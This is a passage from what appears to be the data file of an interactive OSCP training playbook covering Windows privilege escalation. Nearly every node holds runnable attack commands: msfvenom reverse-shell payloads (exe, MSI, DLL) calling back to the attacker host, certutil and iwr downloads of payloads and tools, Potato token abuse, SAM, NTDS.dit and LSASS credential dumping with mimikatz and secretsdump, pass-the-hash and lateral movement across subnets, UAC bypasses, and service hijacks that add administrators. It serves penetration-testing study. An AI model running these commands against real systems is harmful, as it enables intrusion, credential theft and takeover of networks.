python3 windows-exploit-suggester.py --update   # update the MS bulletin DB
python3 windows-exploit-suggester.py --database 2024-XX-XX-mssb.xls --systeminfo sysinfo.txt
# Output: lists unpatched CVEs by severity — take each one to searchsploit

# Searchsploit the OS + patch level directly:
# Example output: "Windows Server 2012 R2 Build 9600"
searchsploit "windows server 2012 r2"
searchsploit "ms16-032"    # specific KB if you know it
searchsploit "ms15-051"
searchsploit "ms14-058"

# Common Windows local privesc CVEs by OS:
# Server 2008 / Win 7:   MS11-046, MS16-032, MS15-051
# Server 2012 / Win 8:   MS16-032, MS15-051, MS14-058
# Server 2016 / Win 10:  Token privesc usually beats kernel — check SeImpersonate first
# Always try token privesc (GodPotato) BEFORE kernel exploits — less risky

# ── NETWORK POSITION ──────────────────────
ipconfig /all                  # all interfaces — look for second NIC
route print                    # routing table — other subnets?
arp -a                         # ARP cache — other hosts
netstat -ano                   # all connections — internal services on 127.0.0.1
# Note: 127.0.0.1:PORT = local-only service nmap never saw → port forward it

# ── GROUP MEMBERSHIPS ─────────────────────
net user %USERNAME%
net localgroup administrators  # am I local admin?
# Local admin + medium integrity = UAC bypass needed
# Local admin + high integrity = already elevated

# ── GRAB THE FLAG ─────────────────────────
type C:\Users\%USERNAME%\Desktop\local.txt 2>nul
Get-ChildItem -Path "C:\Users" -Include "local.txt","proof.txt" \\
  -Recurse -EA SilentlyContinue | Get-Content

# ── AV / DEFENDER CHECK ───────────────────
sc query windefend            # Windows Defender running?
Get-MpComputerStatus          # Defender status (PowerShell)
# If Defender is running and blocking tools — amsi_bypass first

# ── QUICK WINS BEFORE WINPEAS ─────────────
# Check these manually — they're faster than waiting for WinPEAS

# AlwaysInstallElevated (both keys = instant SYSTEM via MSI)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# Stored credentials
cmdkey /list                  # saved credentials manager entries

# Scheduled tasks (non-Microsoft)
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run" | findstr /v "N/A\|system32"

# Unquoted service paths (quick check)
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '"'`,
    warn: "Read whoami /priv BEFORE running WinPEAS. SeImpersonatePrivilege = GodPotato in 30 seconds. If you see it, stop and exploit immediately — no need to wait for WinPEAS. Medium integrity with local admin group = UAC bypass needed. High integrity = already elevated, skip UAC. netstat -ano is critical — local-only services on 127.0.0.1 that nmap missed are often the actual privesc vector.",
    choices: [
      { label: "SeImpersonatePrivilege — Potato now", next: "token_privs" },
      { label: "AlwaysInstallElevated set — MSI payload", next: "always_install_elevated" },
      { label: "Local admin + medium integrity — UAC bypass", next: "win_uac_bypass" },
      { label: "New subnet in route print — pivot", next: "pivot_start" },
      { label: "Defender blocking — AMSI bypass first", next: "amsi_bypass" },
      { label: "Run WinPEAS (full automated)", next: "winpeas" },
    ],
  },

  winpeas: {
    phase: "WINDOWS",
    title: "WinPEAS — Automated Windows Enumeration",
    body: "WinPEAS is thorough but produces overwhelming output. The skill is triage: read RED first, then YELLOW. Most people run it, get wall-of-text, and miss the actual finding. Know the five categories that produce actionable OSCP results and grep for them directly. Run PowerUp alongside WinPEAS — they catch different things. Tee output to a file so you can re-grep later.",
    cmd: `# ── TRANSFER WINPEAS ─────────────────────
# Kali: python3 -m http.server 80
# Windows (PowerShell):
iwr http://$LHOST/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
# Windows (cmd.exe):
certutil -urlcache -split -f http://$LHOST/winPEASx64.exe C:\Windows\Temp\wp.exe
# Via SMB (if HTTP blocked):
# Kali: impacket-smbserver share . -smb2support
copy \\$LHOST\share\winPEASx64.exe C:\Windows\Temp\wp.exe

# ── RUN AND CAPTURE ───────────────────────
C:\Windows\Temp\wp.exe | Out-File C:\Windows\Temp\wp_out.txt
# Or ansi output (color stripped — easier to read):
C:\Windows\Temp\wp.exe -ansi | Out-File C:\Windows\Temp\wp_ansi.txt

# ── TRIAGE: READ IN THIS ORDER ────────────
# 1. TOKEN PRIVILEGES (fastest win)
#    Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
#    → GodPotato / PrintSpoofer → instant SYSTEM

# 2. ALWAYSINSTALLELEVATED
#    Both registry keys = 0x1 → MSI payload → SYSTEM

# 3. SERVICE VULNERABILITIES
#    Unquoted path + writable prefix directory
#    Weak service permissions (you can modify binary path)
#    Writable service binary

# 4. STORED CREDENTIALS
#    cmdkey entries, SAM/SYSTEM accessible, registry passwords
#    Browser saved passwords, Credential Manager

# 5. SCHEDULED TASKS
#    Non-Microsoft tasks running as SYSTEM with writable scripts

# ── POWERUP — COMPLEMENTARY TOOL ─────────
iwr http://$LHOST/PowerUp.ps1 -OutFile C:\Windows\Temp\pu.ps1
. C:\Windows\Temp\pu.ps1
Invoke-AllChecks | Out-File C:\Windows\Temp\pu_out.txt

# PowerUp catches specifically:
#   Invoke-ServiceAbuse (weak perms)
#   Write-ServiceBinary (binary replacement)
#   Find-PathDLLHijack (DLL hijack)
#   Get-UnquotedService (unquoted paths)
#   Get-RegAlwaysInstallElevated

# ── GREP THE OUTPUT FOR KEY VECTORS ───────
# On Windows (PowerShell):
Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "SeImpersonate|Impersonat"
Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "AlwaysInstall"
Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "Unquoted"
Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "No quotes and Space"
Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "password|Password|PASSWORD"

# ── SEATBELT — TARGETED CHECKS ────────────
iwr http://$LHOST/Seatbelt.exe -OutFile C:\Windows\Temp\sb.exe
# Run all checks:
C:\Windows\Temp\sb.exe -group=all
# Targeted — just credentials:
C:\Windows\Temp\sb.exe CredEnum WindowsCredentialFiles DpapiMasterKeys
# Targeted — system:
C:\Windows\Temp\sb.exe TokenGroups TokenPrivileges UAC`,
    warn: "WinPEAS with Defender running will often get caught and deleted. Run Defender check first (sc query windefend). If Defender is active: use AMSI bypass first, or use PowerUp (less detected) instead. Tee WinPEAS output to a file — you will want to re-grep it after finding a vector. Don't act on every RED finding: some are informational. The five categories above are the only ones that reliably produce OSCP wins.",
    choices: [
      { label: "SeImpersonatePrivilege — Potato attack", next: "token_privs" },
      { label: "AlwaysInstallElevated — MSI payload", next: "always_install_elevated" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "Stored credentials found", next: "windows_creds" },
      { label: "Nothing clear — go manual", next: "windows_manual_enum" },
      { label: "WinPEAS output overwhelming — help me read it", next: "wp_output_triage" },
    ],
  },

  wp_output_triage: {
    phase: "WINDOWS",
    title: "WinPEAS — Reading the Output",
    body: "WinPEAS produces 800-2000 lines. The color system: RED = high confidence exploitable, YELLOW = interesting needs verification, cyan = informational. Do not read sequentially. Read five sections in priority order — everything else is noise unless those five produce nothing.",
    cmd: `# ══ READING ORDER — triage, not sequential ══

# ── PRIORITY 1: TOKEN PRIVILEGES (fastest win) ──
Select-String -Path wp_out.txt -Pattern "SeImpersonatePrivilege|SeAssignPrimaryToken"
# SeImpersonatePrivilege ENABLED → GodPotato/PrintSpoofer → SYSTEM now
# Must be 'Enabled' not just 'Present' — check the third column

# ── PRIORITY 2: ALWAYSINSTALLELEVATED ─────
Select-String -Path wp_out.txt -Pattern "AlwaysInstallElevated"
# BOTH HKLM and HKCU must be 0x1 — one key alone is not enough

# ── PRIORITY 3: SERVICE VULNERABILITIES ───
Select-String -Path wp_out.txt -Pattern "Unquoted|No quotes|can write|Weak permissions|modifiable binary"
# "No quotes and Space detected" in WinPEAS = unquoted service path
# "Everyone" or "BUILTIN\Users" with Write/Full = weak service perms

# ── PRIORITY 4: STORED CREDENTIALS ────────
Select-String -Path wp_out.txt -Pattern "password|Password|credential|cmdkey" | \
  Select-String -NotMatch "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session"
# Look for lines with actual values, not system key noise

# ── PRIORITY 5: SCHEDULED TASKS ───────────
Select-String -Path wp_out.txt -Pattern "Task To Run|Run As User" | \
  Select-String -NotMatch "Microsoft|N/A"
# Tasks running as SYSTEM with writable script paths = privesc

# ══ KALI GREP (after transferring output file) ══
grep -iE "seimpersonate|alwaysinstall|unquoted|no quotes|VULNERABLE" wp_out.txt
grep -iE "password|credential|cmdkey" wp_out.txt | grep -iv "system32\|default\|control set"

# ══ POWERUP AS CROSS-CHECK ════════════════
# WinPEAS and PowerUp catch different things — run both
iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
. C:\\Windows\\Temp\\pu.ps1; Invoke-AllChecks | Out-File C:\\Windows\\Temp\\pu_out.txt`,
    warn: "SeImpersonatePrivilege must show 'Enabled' in whoami /priv — 'Present' but disabled is not exploitable. AlwaysInstallElevated needs BOTH registry keys to be 0x1. A writable service binary path is only useful if YOUR current user has Write permission — verify with icacls before attempting.",
    choices: [
      { label: "SeImpersonatePrivilege Enabled", next: "token_privs" },
      { label: "AlwaysInstallElevated — both keys 0x1", next: "always_install_elevated" },
      { label: "Unquoted service path found", next: "unquoted_service" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "Credentials in output", next: "windows_creds" },
      { label: "Nothing actionable — go manual", next: "windows_manual_enum" },
    ],
  },

  token_privs: {
    phase: "WINDOWS",
    title: "Token Impersonation (Potato)",
    body: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = instant SYSTEM on almost every Windows version. No Metasploit needed.",
    cmd: `whoami /priv
# ── INSTANT SYSTEM — POTATO FAMILY ──────
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# Any of these = GodPotato → instant SYSTEM

# GodPotato — most universal (Server 2012-2022, Win 10/11)
iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
.\\gp.exe -cmd "cmd /c whoami"
.\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"

# PrintSpoofer — Windows 10 / Server 2016-2019
iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe
.\\ps.exe -i -c cmd
.\\ps.exe -c "C:\\Windows\\Temp\\shell.exe"

# JuicyPotatoNG — if others fail
.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"

# ── SeBackupPrivilege → SAM DUMP ──────────
# SeBackupPrivilege lets you read ANY file regardless of ACL
# No potato needed — dump SAM + SYSTEM directly

# Check if you have it:
whoami /priv | findstr SeBackup

# Method 1 — reg save (simplest):
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys
# Transfer both files to Kali, then:
impacket-secretsdump -sam sam -system sys LOCAL
# Crack NTLM hashes or pass-the-hash

# Method 2 — robocopy bypass (copy protected files):
robocopy /b C:\\Windows\\System32\\config C:\\Windows\\Temp SAM SYSTEM
impacket-secretsdump -sam C:\\Windows\\Temp\\SAM -system C:\\Windows\\Temp\\SYSTEM LOCAL

# ── SeDebugPrivilege → LSASS DUMP ─────────
# Allows attaching to LSASS — mimikatz sekurlsa::logonpasswords
# Check: whoami /priv | findstr SeDebug
.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`,
    warn: "SeBackupPrivilege is commonly found on backup service accounts, IT support accounts, and IIS app pool accounts — not just admins. It's easy to overlook because it doesn't have 'impersonate' in the name. Pair with impacket-secretsdump for instant hash extraction without needing SYSTEM first.",
    choices: [
      { label: "Potato worked — SYSTEM!", next: "got_root_windows" },
      { label: "SeBackupPrivilege — dumped SAM hashes", next: "hashcrack" },
      { label: "SeDebugPrivilege — dumped LSASS creds", next: "creds_found" },
      { label: "No useful privs — check other vectors", next: "winpeas" },
    ],
  },

  unquoted_service: {
    phase: "WINDOWS",
    title: "Unquoted Service Path",
    body: "Service path with spaces and no quotes = Windows searches each path component. Drop your binary in the writable prefix location.",
    cmd: `# Find unquoted paths
wmic service get name,displayname,pathname,startmode \\
  | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"

# Manual check with sc
sc qc <ServiceName>

# Example vulnerable path:
# C:\\Program Files\\Some Folder\\service.exe
# Windows tries: C:\\Program.exe first (writable?)
#               C:\\Program Files\\Some.exe

# Generate payload (no MSF console needed — msfvenom is standalone)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f exe -o Program.exe

# Transfer payload to writable location
# Start listener: nc -nlvp $LPORT
sc stop <ServiceName>
sc start <ServiceName>`,
    warn: null,
    choices: [
      { label: "Service restart — got SYSTEM shell", next: "got_root_windows" },
      { label: "Can't write to that path", next: "weak_service" },
    ],
  },

  weak_service: {
    phase: "WINDOWS",
    title: "Weak Service Permissions",
    body: "If you have WRITE_DAC or SERVICE_CHANGE_CONFIG on a service, you can redirect its binary path to your payload.",
    cmd: `# Find weak service perms
.\\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
.\\accesschk.exe -uwcqv "Everyone" * /accepteula
.\\accesschk.exe -uwcqv "$USER" * /accepteula

# Modify binary path
sc config <ServiceName> binpath= "C:\\Windows\\Temp\\shell.exe"
sc config <ServiceName> binpath= "net localgroup administrators user /add"

sc stop <ServiceName>
sc start <ServiceName>

# Check service recovery options too
sc qfailure <ServiceName>`,
    warn: null,
    choices: [
      { label: "Got SYSTEM via modified service", next: "got_root_windows" },
    ],
  },

  always_install_elevated: {
    phase: "WINDOWS",
    title: "AlwaysInstallElevated",
    body: "Both registry keys at 1 = MSI files run as SYSTEM. Generate a malicious MSI with msfvenom (standalone, no console needed).",
    cmd: `# Verify BOTH keys (must be 1)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Generate MSI payload (msfvenom standalone — no MSF console)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi

# Transfer and execute
nc -nlvp $LPORT
msiexec /quiet /qn /i C:\\Windows\\Temp\\shell.msi`,
    warn: null,
    choices: [
      { label: "Got SYSTEM via MSI!", next: "got_root_windows" },
    ],
  },

  windows_creds: {
    phase: "WINDOWS",
    title: "Windows Credential Hunting",
    body: "Check everywhere: registry, cmdkey, SAM/SYSTEM, browser creds, config files. secretsdump and mimikatz are manual tools — no MSF needed.",
    cmd: `# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd

# Registry password hunt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# SAM + SYSTEM dump (must be admin — local accounts only)
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys
# Transfer both to Kali, then:
impacket-secretsdump -sam sam -system sys LOCAL
# Output format: Administrator:500:LM:NTLM:::
# Use the NTLM field (after second colon) for PtH or cracking

# ── NTDS.DIT — DOMAIN CONTROLLER ONLY ────
# Contains ALL domain account hashes — DC privesc jackpot
# Must be SYSTEM or DA on the DC

# Method 1 — secretsdump remote (if you have DA creds):
impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm

# Method 2 — VSS shadow copy (from DC SYSTEM shell):
# Create shadow copy
vssadmin create shadow /for=C:
# Note the shadow copy path (e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\\Windows\\Temp\\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\\Windows\\Temp\\sys
# Transfer both to Kali:
impacket-secretsdump -ntds ntds.dit -system sys LOCAL -outputfile domain_hashes
# Crack or PtH with Administrator hash

# ── MIMIKATZ ──────────────────────────────
.\\mimikatz.exe "privilege::debug" \\
  "token::elevate" \\
  "sekurlsa::logonpasswords" \\
  "lsadump::sam" \\
  "lsadump::cache" \\
  "exit"

# Interesting file locations
dir /s /b C:\\Users\\*.xml 2>nul
dir /s /b C:\\Users\\*.txt 2>nul
dir /s /b C:\\*pass* 2>nul
dir /s /b C:\\*.config 2>nul`,
    warn: "secretsdump output format is username:RID:LM:NTLM::: — the NTLM hash is the 4th field. Machine accounts (ending in $) appear in the output — skip them for cracking, focus on user accounts. ntds.dit requires a SYSTEM hive to decrypt — always grab both files together.",
    choices: [
      { label: "Found NTLM hash — Pass the Hash", next: "pth" },
      { label: "Found plaintext creds", next: "creds_found" },
      { label: "Check DPAPI (browser/credential manager)", next: "dpapi" },
    ],
  },

  pth: {
    phase: "WINDOWS",
    title: "Pass the Hash",
    body: "NTLM hashes authenticate without cracking — you do not need to crack them. The format is LM:NTLM — you only need the NTLM part (after the colon). evil-winrm for WinRM (5985), psexec for SMB + service (gives SYSTEM, noisier), wmiexec for stealth (no service written). Verify with CME first before attempting a connection — saves time. This works for local admin and domain admin hashes alike. If the hash is from secretsdump output, grab the 4th field.",
    cmd: `# ── STEP 0: PARSE THE HASH ────────────────
# secretsdump output format:
# Administrator:500:LM_HASH:NTLM_HASH:::
# You want the NTLM part (4th field, after 3rd colon)
# Example: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
#                                          ^^^^ this is the NTLM hash

# ── STEP 1: VERIFY HASH WORKS (CME) ──────
# Always verify before attempting a full connection
crackmapexec smb $ip -u administrator -H <NTLM_HASH>
crackmapexec winrm $ip -u administrator -H <NTLM_HASH>
# "(Pwn3d!)" in output = local admin confirmed

# Try across subnet if in AD environment:
crackmapexec smb 172.16.1.0/24 -u administrator -H <NTLM_HASH> --local-auth

# ── STEP 2: GET A SHELL ───────────────────
# evil-winrm — best for WinRM (port 5985/5986)
evil-winrm -i $ip -u administrator -H <NTLM_HASH>

# impacket-psexec — SMB + service (SYSTEM shell, noisier)
impacket-psexec administrator@$ip -hashes :NTLM_HASH
impacket-psexec domain/administrator@$ip -hashes :NTLM_HASH

# impacket-wmiexec — stealth (no service written to disk)
impacket-wmiexec administrator@$ip -hashes :NTLM_HASH

# impacket-smbexec — SMB only, no disk write
impacket-smbexec domain/administrator@$ip -hashes :NTLM_HASH

# ── STEP 3: LATERAL MOVEMENT WITH HASH ───
# Hash from one machine → try on all machines in subnet
for host in $(cat internal_live.txt); do
  crackmapexec smb $host -u administrator -H <NTLM_HASH> --local-auth
done

# ── STEP 4: CRACK IF PtH FAILS ────────────
# PtH requires NTLM auth — Kerberos-only environments block it
# If connections fail, try cracking the hash instead:
echo "<NTLM_HASH>" > hash.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
# -m 1000 = NTLM`,
    warn: "PtH format for impacket tools: -hashes LM:NTLM or -hashes :NTLM (just colon + NTLM if you don't have LM). evil-winrm uses -H NTLM with no colons. If CME shows (Pwn3d!) but evil-winrm fails, WinRM may not be enabled — try psexec or wmiexec on 445. PtH doesn't work against Kerberos-only targets (common on newer AD setups) — crack the hash or use a TGT/TGS ticket instead.",
    choices: [
      { label: "Got shell — SYSTEM on standalone", next: "got_root_windows" },
      { label: "Got shell — domain machine, keep moving", next: "lateral_movement" },
      { label: "CME shows Pwn3d across multiple machines", next: "lateral_movement" },
      { label: "PtH blocked — crack the hash instead", next: "hashcrack" },
    ],
  },

  windows_manual_enum: {
    phase: "WINDOWS",
    title: "Windows — Deep Manual Enumeration",
    body: "WinPEAS ran and nothing actionable surfaced — or you need to understand what it found before exploiting. Manual enumeration covers every attack surface category. Work through them in order: services and tasks are the most common OSCP vectors, then credential hunting, then network internals. Each category has a specific question: can I write this file? Can I control this service? Is this port reachable internally?",
    cmd: `# ── SERVICES — MOST COMMON OSCP VECTOR ───
# Non-Windows services with full paths
wmic service get name,displayname,startmode,pathname \\
  | findstr /i /v "C:\Windows\\"

# Unquoted service paths (look for spaces without quotes)
wmic service get name,pathname \\
  | findstr /i /v "C:\Windows\\" | findstr /i /v '"'
# Vulnerable: C:\Program Files\Vuln App\service.exe  (no quotes, has spaces)

# Weak service permissions — can you modify it?
# Download accesschk or use sc
sc sdshow <ServiceName>   # read the SDDL permissions
# Or: accesschk.exe /accepteula -wuvc <ServiceName>

# Writable service binaries
for /f "tokens=2 delims='='" %s in ('wmic service list full^|find /i "pathname"^|find /i /v "svchost"') do (
  icacls "%s" 2>nul | findstr /i "Everyone\|BUILTIN\\Users\|Authenticated Users" | findstr "F\|M\|W"
)

# ── SCHEDULED TASKS ───────────────────────
# All non-Microsoft tasks
schtasks /query /fo LIST /v \\
  | findstr /i "Task Name:\|Run As User:\|Task To Run:" \\
  | findstr /v "N/A\|\Microsoft"

# PowerShell — get tasks with their run paths:
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} \\
  | Select-Object TaskName,@{N='Action';E={$_.Actions.Execute}},@{N='RunAs';E={$_.Principal.UserId}}

# For each interesting task:
schtasks /query /fo LIST /v /tn "TaskName"
# Key fields: Run As User (privilege gained), Task To Run (can you write it?)
icacls "C:\path\to\task\binary.exe"   # check write permissions

# ── INSTALLED SOFTWARE — VERSION HUNTING ──
wmic product get name,version | findstr /v "^$"
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* \\
  | Select DisplayName,DisplayVersion | Sort DisplayName

# Search for CVEs on installed apps:
# searchsploit <product> <version>

# ── REGISTRY AUTORUNS ─────────────────────
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
# Can you write to the binary referenced?
# icacls "C:\path\to\autorun.exe"

# ── NETWORK INTERNALS ─────────────────────
netstat -ano
# Services on 127.0.0.1 that nmap never saw:
netstat -ano | findstr "127.0.0.1\|LISTENING"
# Map PID to process:
tasklist /fi "pid eq <PID>"
# Port forward to access from Kali:
# chisel client $LHOST:8080 R:LOCAL_PORT:127.0.0.1:INTERNAL_PORT

route print        # other subnets → pivot path
arp -a             # other hosts this machine has talked to

# ── CREDENTIAL HUNTING ────────────────────
# Saved credentials in Credential Manager
cmdkey /list
# Run as saved user:
runas /savecred /user:DOMAIN\admin "cmd /c whoami > C:\Windows\Temp\out.txt"

# Registry password hunt
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"

# Unattend.xml / Sysprep (leftover deployment creds — plaintext or base64)
dir /s /b C:\Windows\Panther\Unattend*.xml 2>nul
dir /s /b C:\Windows\System32\Sysprep\*.xml 2>nul
# If found: grep for <Password> or <AdministratorPassword>

# Config files with passwords
dir /s /b C:\\inetpub\\*.config 2>nul
dir /s /b C:\\xampp\\*.ini 2>nul
findstr /si "password" C:\\inetpub\\wwwroot\\*.config 2>nul
findstr /si "password" C:\\*.xml C:\\*.ini C:\\*.txt 2>nul

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Contains every PS command run — often has credentials

# ── DLL HIJACK HUNTING ────────────────────
# Services that load DLLs from writable directories
# Check known DLL hijack targets (Process Monitor is ideal with RDP)
# Without Procmon: check common patterns
Get-WmiObject win32_service | where {$_.State -eq "Running"} \\
  | select Name,PathName | foreach { icacls (Split-Path $_.PathName) 2>nul \\
  | findstr /i "Everyone\|Users.*M\|Users.*W\|Users.*F" }`,
    warn: "PowerShell history (ConsoleHost_history.txt) is one of the highest-yield credential sources on Windows — admins frequently type passwords in PS commands and forget. Unattend.xml leftover from OS deployment contains the Administrator password in base64 or cleartext and is present on a surprising number of OSCP machines. netstat -ano 127.0.0.1 ports are your second attack surface — treat them as a separate machine accessible via port forward.",
    choices: [
      { label: "Suspicious scheduled task — writable binary", next: "win_schtask" },
      { label: "DLL hijack opportunity found", next: "win_dll_hijack" },
      { label: "UAC is the blocker — bypass it", next: "win_uac_bypass" },
      { label: "Internal port — port forward and attack", next: "pivot_start" },
      { label: "Credentials found in registry/files", next: "creds_found" },
      { label: "Nothing — credential hunting next", next: "windows_creds" },
    ],
  },

  win_schtask: {
    phase: "WINDOWS",
    title: "Scheduled Task Exploitation",
    body: "A task running as SYSTEM that executes a file you can write is a direct privesc. Three questions: what does it run, can you modify it, when does it trigger?",
    cmd: `# ── INVESTIGATE THE TASK ─────────────────
schtasks /query /fo LIST /v /tn "TaskName"
# Key fields:
#   Run As User: SYSTEM        <- privilege you gain
#   Task To Run: C:\path\exe   <- can you write this file?
#   Next Run Time:             <- when does it fire?

# ── CHECK WRITE PERMISSIONS ──────────────
icacls "C:\path\to\task\binary.exe"
# Look for: (F) Full  (M) Modify  (W) Write for your user

accesschk.exe /accepteula -wuv "C:\path\to\binary.exe"

# ── EXPLOIT: REPLACE BINARY ──────────────
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# Transfer to target
certutil -urlcache -split -f http://$LHOST/shell.exe C:\path\to\binary.exe

# Start listener
nc -nlvp $LPORT

# Trigger task immediately (if you have rights)
schtasks /run /tn "TaskName"
# Otherwise: wait for Next Run Time

# ── EXPLOIT: MODIFY SCRIPT ───────────────
# If task runs .bat or .ps1 you can write:
echo C:\Windows\Temp\shell.exe >> C:\path\to\task.bat`,
    warn: "If Next Run Time is hours away: check schtasks /run to force trigger. If denied, set a timer and come back — don't burn time waiting. Move to another machine.",
    choices: [
      { label: "Task triggered — SYSTEM shell", next: "got_root_windows" },
      { label: "Cannot write — try DLL hijack", next: "win_dll_hijack" },
    ],
  },

  win_dll_hijack: {
    phase: "WINDOWS",
    title: "DLL Hijacking",
    body: "Privileged process searches for a DLL in a directory you can write — plant your own. Windows DLL search order is the attack surface. 64-bit process needs 64-bit DLL.",
    cmd: `# ── FIND CANDIDATES ──────────────────────
# Method 1: Procmon filter (if RDP)
# Filter: Result = NAME NOT FOUND, Path ends .dll
# Look for: SYSTEM process searching writable directories

# Method 2: Check service directories for write access
Get-WmiObject win32_service | where {$_.State -eq "Running"} | select Name,PathName
accesschk.exe /accepteula -wud "C:\Program Files\VulnApp\"

# Method 3: PowerSploit
Find-PathDLLHijack
Find-ProcessDLLHijack

# DLL search order (simplified):
# 1. Application directory
# 2. System32
# 3. System (SysWOW64)
# 4. Windows directory
# 5. Current directory
# 6. PATH directories  <- often writable!

# ── CHECK PATH FOR WRITABLE DIRS ─────────
$env:PATH -split ';' | % { icacls $_ 2>$null | findstr /i "everyone\|users\|modify\|write" }

# ── CREATE MALICIOUS DLL ─────────────────
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f dll -o target.dll

# ── PLANT AND TRIGGER ────────────────────
copy target.dll "C:\writable\path\missing.dll"
nc -nlvp $LPORT

# Restart service
sc stop VulnService && sc start VulnService`,
    warn: "msfvenom -f dll defaults to 32-bit. For 64-bit processes use windows/x64/shell_reverse_tcp explicitly. Mismatched architecture = the DLL loads but silently fails.",
    choices: [
      { label: "DLL loaded — SYSTEM shell", next: "got_root_windows" },
      { label: "Cannot restart service — try UAC bypass", next: "win_uac_bypass" },
    ],
  },

  win_uac_bypass: {
    phase: "WINDOWS",
    title: "UAC Bypass — Medium to High Integrity",
    body: "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership — check first.",
    cmd: `# ── CONFIRM UAC IS THE ISSUE ─────────────
whoami /groups | findstr /i "mandatory\|integrity"
# Medium Mandatory Level = UAC restricting you
# High Mandatory Level = already elevated, not UAC

# ── METHOD 1: FODHELPER (Win 10/11) ──────
# Pure registry — no binary needed
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "(default)" -Value "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# ── METHOD 2: EVENTVWR (older Windows) ───
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" \
  "(default)" "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# ── METHOD 3: CMSTP.EXE ──────────────────
# Requires crafted .inf file
# Reference: MITRE T1218.003

# ── METHOD 4: UACME ──────────────────────
# 60+ bypass methods, regularly updated
# Transfer UACMe.exe — run with method number
.\Akagi64.exe 33 C:\Windows\Temp\shell.exe

# ── LISTENER ─────────────────────────────
nc -nlvp $LPORT`,
    warn: "If whoami /groups shows you are NOT in the Administrators group — UAC bypass won't help. You need actual privilege escalation first, not just integrity elevation. These are different problems.",
    choices: [
      { label: "High integrity shell achieved", next: "got_root_windows" },
      { label: "Not in Administrators — wrong path", next: "winpeas" },
      { label: "Try token impersonation instead", next: "token_privs" },
    ],
  },

  got_root_windows: {
    phase: "WINDOWS",
    title: "SYSTEM — Windows",
    body: "SYSTEM shell. Get proof, take the screenshot correctly. whoami + hostname + ipconfig + proof.txt all visible.",
    cmd: `whoami   # should show NT AUTHORITY\\SYSTEM or Administrator
hostname
ipconfig /all
type C:\\Users\\Administrator\\Desktop\\proof.txt

# Screenshot checklist:
